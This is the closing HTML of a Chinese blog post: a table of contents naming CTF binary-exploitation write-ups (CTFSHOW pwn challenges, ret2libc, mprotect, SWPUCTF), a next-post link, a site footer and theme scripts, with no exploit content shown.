        </div>
        <div class="top-div">
          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#CTFSHOW"><span class="top-box-text">CTFSHOW</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn37-38-return-text"><span class="top-box-text">pwn37&#x2F;38(return text)</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E5%AD%98%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="top-box-text">查看内存常用命令</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn39%EF%BC%88%E6%B2%A1%E6%9C%89%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%EF%BC%89"><span class="top-box-text">pwn39（没有后门函数）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn40%EF%BC%88%E6%B2%A1%E6%9C%89%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%EF%BC%8Cx64%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E4%BC%A0%E5%8F%82%E9%A1%BA%E5%BA%8F%EF%BC%89"><span class="top-box-text">pwn40（没有后门函数，x64的寄存器传参顺序）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn41-42-bin-sh%E4%BD%BF%E7%94%A8sh%E4%BB%A3%E6%9B%BF"><span class="top-box-text">pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn43-44%EF%BC%88%E6%9E%84%E9%80%A0-bin-sh-gdb%E8%B0%83%E8%AF%95%E8%B7%9F%E8%B8%AA%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="top-box-text">pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn45-46-got%E8%A1%A8%E6%B3%84%E9%9C%B2-ret2libc"><span class="top-box-text">pwn45&#x2F;46(got表泄露) ret2libc</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn47-48%EF%BC%88ret2libc-LibcSeacher%EF%BC%89"><span class="top-box-text">pwn47&#x2F;48（ret2libc - LibcSeacher）</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%9B%9B%E4%B8%AAlibc%E7%9B%AE%E5%BD%95%E5%8C%BA%E5%88%AB"><span class="top-box-text">四个libc目录区别</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%EF%BC%9A%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%9D%83%E9%99%90mprotect"><span class="top-box-text">pwn49(静态编译：修改内存权限mprotect)</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#mprotect%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B"><span class="top-box-text">mprotect函数原型</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#read%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B"><span class="top-box-text">read函数原型</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#pop-edx"><span class="top-box-text">pop_edx</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn50-mprotect-ret2libc"><span class="top-box-text">pwn50(mprotect ret2libc )</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E5%BD%A9%E8%9B%8B%EF%BC%9A%E8%A7%A3%E5%86%B3%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E9%97%AE%E9%A2%98"><span class="top-box-text">彩蛋：解决中文输入法问题</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#ret2libc"><span class="top-box-text">ret2libc</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#mprotect"><span class="top-box-text">mprotect</span></a></li></ol></li></ol></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#NSSCTF"><span class="top-box-text">NSSCTF</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-nc%E7%AD%BE%E5%88%B0%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="top-box-text">[SWPUCTF 2021 新生赛]nc签到（字符串过滤）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-gift-pwn%EF%BC%88%E6%A0%88%E6%BA%A2%E5%87%BA%E6%9F%A5%E7%9C%8B%E5%81%8F%E7%A7%BB%EF%BC%89"><span class="top-box-text">[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#gdb%E6%9F%A5%E7%9C%8B%E5%86%85%E5%AD%98%E5%91%BD%E4%BB%A4"><span class="top-box-text">gdb查看内存命令</span></a></li></ol></li></ol></li></ol>
        </div>
      </div>
    </div>

    
      <div class="next-post">
        <a class="purple-link" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/">
          <h3 class="post-title">
            下一篇：数论和抽象代数基础
          </h3>
        </a>
      </div>
    
  </div>










<footer>
<div class="site-footer">
  <div class="social-container">
    
      
        <a aria-label="跳转至github" href="https://github.com/Kidder1" target="_blank">
          <i class="icon icon-github"></i>
        </a>
      
    
      
    
      
    
      
    
      
    
  </div>
  
  
  
  
  
    
      <a href="https://beian.miit.gov.cn" target="_blank">陕ICP备2022004010号-1</a>
  
  
</div>
</footer>


      </div>
    </div>
    
<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>

<script src="/js/main.js"></script>






  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
</html>

